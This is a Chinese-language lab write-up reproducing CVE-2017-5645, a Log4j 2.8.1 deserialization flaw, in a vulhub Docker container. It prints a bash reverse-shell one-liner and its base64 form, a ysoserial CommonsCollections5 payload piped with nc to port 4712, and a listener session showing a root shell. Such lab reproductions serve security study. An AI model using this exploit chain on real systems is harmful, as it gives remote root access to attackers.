# CVE-2017-5645

### 环境搭建：

下载地址：

{% embed url="https://github.com/Medicean/VulApps" %}

下载好以后，cd到对应的目录下面执行以下命令

{% code lineNumbers="true" %}
```
root@debian:~/vulhub/log4j/CVE-2017-5645# docker-compose up -d
root@debian:~/vulhub/log4j/CVE-2017-5645# docker ps -a
CONTAINER ID   IMAGE                COMMAND                  CREATED          STATUS          PORTS                                       NAMES
ac946c5599c8   vulhub/log4j:2.8.1   "java -jar /log4jrce…"   4 minutes ago    Up 4 minutes    0.0.0.0:4712->4712/tcp, :::4712->4712/tcp   cve-2017-5645_log4j_1

```
{% endcode %}

可以看到服务已经运行起来了，对应的端口是

然后下载ysoserial

{% embed url="https://github.com/frohoff/ysoserial/releases/tag/v0.0.6" %}

生产反弹shell的payload，然后将其base64编码

```
bash -i >& /dev/tcp/192.168.254.129/9992 0>&1
YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjI1NC4xMjkvOTk5MiAwPiYx
```

在终端中使用该工具，将上面的base64反弹shell的payload放入到下面执行的命令中

```
┌──(root㉿kali)-[~/Desktop/test/jdk1.8.0_202/bin]
└─# ./java -jar ../../ysoserial-all.jar CommonsCollections5 "bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjI1NC4xMjkvOTk5MiAwPiYx}|{base64,-d}|{bash,-i}" | nc 192.168.254.130 4712
Picked up _JAVA_OPTIONS: -Dawt.useSystemAAFontSettings=on -Dswing.aatext=true
```

在本机开启一个监听，可以看到返回了一个shell

```
┌──(root㉿kali)-[~/Desktop/test/jdk1.8.0_202/bin]
└─# nc -lnvp 9992
listening on [any] 9992 ...
connect to [192.168.254.129] from (UNKNOWN) [192.168.254.130] 45468
bash: cannot set terminal process group (1): Inappropriate ioctl for device
bash: no job control in this shell
root@ac946c5599c8:/# whoami
whoami
root
```

